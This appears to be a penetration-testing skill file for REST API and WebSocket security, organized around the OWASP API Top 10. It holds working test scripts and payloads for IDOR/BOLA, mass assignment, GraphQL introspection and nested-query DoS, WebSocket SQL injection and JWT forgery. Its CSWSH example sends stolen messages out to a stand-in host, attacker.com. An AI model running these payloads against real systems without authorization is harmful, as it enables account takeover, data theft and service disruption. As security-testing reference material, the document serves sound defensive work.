---
name: api_rest_websocket
description: REST API and WebSocket security - OWASP API Top 10, BOLA/IDOR, mass assignment, BFLA, CSWSH, message injection, versioning exposure
---

# REST API & WebSocket Security

API vulnerabilities top the OWASP API Security list and are frequently low-hanging fruit in modern applications. REST APIs expose business logic directly; WebSockets bypass many traditional web security controls.

## OWASP API Security Top 10

| API# | Name | Quick Test |
|------|------|------------|
| API1 | BOLA (Broken Object Level Auth) | Replace object IDs in path/params |
| API2 | Broken Authentication | Weak JWT, no token expiry |
| API3 | Broken Object Property Level Auth | Mass assignment, overexposure |
| API4 | Unrestricted Resource Consumption | No rate limits, large payloads |
| API5 | Broken Function Level Auth (BFLA) | Use user token for admin endpoints |
| API6 | Unrestricted Access to Sensitive Business Flows | Race conditions, unlimited purchases |
| API7 | Server Side Request Forgery | URL params that fetch remote resources |
| API8 | Security Misconfiguration | Cors *, debug endpoints, verbose errors |
| API9 | Improper Inventory Management | /v1/ vs /v2/ vs /internal/ exposure |
| API10 | Unsafe Consumption of APIs | Trusting external API responses without validation |

## BOLA (Broken Object Level Authorization)

The most common API vulnerability: test every object ID.

```python
import requests

def test_bola(base_url, endpoint, my_id, other_id, token):
    """Test if we can access another user's resource"""
    my_url = f"{base_url}{endpoint}/{my_id}"
    other_url = f"{base_url}{endpoint}/{other_id}"
    
    headers = {"Authorization": f"Bearer {token}"}
    
    my_r = requests.get(my_url, headers=headers)
    other_r = requests.get(other_url, headers=headers)
    
    if other_r.status_code == 200:
        print(f"[BOLA] Access to other user's resource: {other_url}")
        print(f"  Response: {other_r.text[:300]}")
    
    return other_r.status_code, other_r.json() if other_r.status_code == 200 else None

# Test across ID types:
# Sequential integer: /api/v1/orders/1001 → /api/v1/orders/1002
# UUID: swap UUID from one account to another
# Username: /api/users/victim@corp.com/profile
# Nested: /api/users/VICTIM_ID/messages
```

## Mass Assignment (Broken Object Property Level Auth)

```python
# Normal request:
POST /api/v1/user/profile
{"name": "Alice", "email": "alice@example.com"}

# Add admin fields that shouldn't be accepted:
POST /api/v1/user/profile
{
  "name": "Alice",
  "email": "alice@example.com",
  "role": "admin",
  "is_admin": true,
  "credit": 99999,
  "subscription": "premium",
  "verified": true
}

# If response includes the injected fields → mass assignment confirmed
```

**Common mass assignment targets:**
```
role, is_admin, admin, superuser, verified, active, credit, balance,
subscription_plan, permissions, scopes, access_level, group_id
```

## BFLA (Broken Function Level Authorization)

```python
# Send admin-only requests with a regular user token
admin_endpoints = [
    'GET /api/v1/admin/users',
    'GET /api/v1/admin/audit-log',
    'DELETE /api/v1/users/{other_id}',
    'PUT /api/v1/users/{other_id}/role',
    'GET /api/v1/reports/all',
    'POST /api/v1/admin/config',
]

# Also test HTTP method variation:
# Regular user can GET but what about PUT/DELETE/PATCH?
PUT /api/v1/users/other_user_id
DELETE /api/v1/users/other_user_id
PATCH /api/v1/users/other_user_id {"role": "admin"}
```

## Hidden Endpoint Discovery

```bash
# Verb tampering — try all HTTP methods
for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
    curl -s -o /dev/null -w "%{method} %{http_code}\n" \
         -X $method https://api.example.com/api/v1/users/me
done

# Version enumeration
ffuf -u https://api.example.com/api/FUZZ/users -w <(seq 0 20 | sed 's/^/v/')
# Test: v1, v2, v3, internal, dev, beta, admin, mobile, legacy

# Hidden params (change behavior)
ffuf -u 'https://api.example.com/api/v1/data?FUZZ=true' \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -fs BASELINE_SIZE

# Parameter pollution
GET /api/v1/user?id=mine&id=victim_id
```

## GraphQL Security

```bash
# Introspection (often left on in prod)
curl -X POST https://api.example.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'

# Introspection bypass (fragment method)
{"query":"{ __schema\n{ types { name } } }"}

# Batch query attack (amplify)
[{"query":"{ user(id:1) {email} }"},{"query":"{ user(id:2) {email} }"},...x100]

# Nested query DoS
{"query":"{ user { posts { comments { author { posts { comments { ... } } } } } } }"}

# IDOR via GraphQL
{"query":"{ user(id: \"OTHER_USER_UUID\") { email password apiKey } }"}
```

## WebSocket Security

### Cross-Site WebSocket Hijacking (CSWSH)

```javascript
// WebSocket connections DON'T enforce CORS — Origin is just advisory
// If server doesn't validate Origin header:
var ws = new WebSocket('wss://victim.com/chat');
ws.onopen = function() {
    ws.send('{"action":"get_messages","room_id":"admin"}');
};
ws.onmessage = function(e) {
    fetch('https://attacker.com/steal?data=' + encodeURIComponent(e.data));
};
```

Host this on attacker domain — if server accepts WebSocket from any Origin → CSWSH.

### WebSocket Message Injection

```python
import asyncio, websockets

async def ws_inject():
    uri = "wss://target.com/ws"
    headers = [("Cookie", "session=VICTIM_SESSION")]
    
    async with websockets.connect(uri, extra_headers=headers) as ws:
        # Test SQLi in WebSocket message
        await ws.send('{"action":"search","query":"test\' OR 1=1-- -"}')
        response = await ws.recv()
        print(response)
        
        # Test IDOR
        await ws.send('{"action":"get_user_data","user_id":"victim_id"}')
        response = await ws.recv()
        print(response)

asyncio.run(ws_inject())
```

## Rate Limiting & Resource Consumption

```python
import asyncio, aiohttp

async def send_request(session, url, data):
    async with session.post(url, json=data) as r:
        return r.status

async def rate_limit_test(url, data, count=100):
    """Send 100 requests simultaneously — check if any succeed beyond limit"""
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session, url, data) for _ in range(count)]
        results = await asyncio.gather(*tasks)
        print(f"Status distribution: {set(results)}")
        # If all 200 → no rate limiting

asyncio.run(rate_limit_test('https://api.example.com/api/login', 
                             {'username': 'admin', 'password': 'test'}))
```

## JWT Attacks

```python
import jwt, base64, json

# 1. Algorithm confusion (RS256 → HS256)
# Extract public key from server, sign with HS256 using public key as secret
header = {"alg": "HS256", "typ": "JWT"}
payload = {"user_id": 1, "role": "admin", "iat": 9999999999}
# Get server's public key as secret
forged = jwt.encode(payload, PUBLIC_KEY, algorithm="HS256")

# 2. None algorithm
header_b64 = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')
payload_b64 = base64.urlsafe_b64encode(json.dumps({"user_id":1,"role":"admin"}).encode()).decode().rstrip('=')
forged_none = f"{header_b64}.{payload_b64}."

# 3. Weak secret brute force
# hashcat -a 0 -m 16500 token.jwt wordlist.txt
```

## Validation Approach

1. Capture all API requests via proxy during app walkthrough
2. Map endpoints by function: object IDs, admin functions, bulk operations
3. Test BOLA: replay requests with swapped IDs from second account
4. Test mass assignment: add `role:admin` to every POST/PUT body
5. Test BFLA: send admin endpoint requests with regular user JWT
6. Document: each test request proxy ID → response showing unauthorized access

## Tools

- `arjun` — hidden parameter discovery
- `ffuf` / `feroxbuster` — endpoint discovery with API wordlists
- Burp Suite + AuthMatrix extension — multi-account auth testing
- `websocat` — WebSocket CLI testing
- `graphql-cop` — GraphQL security audit
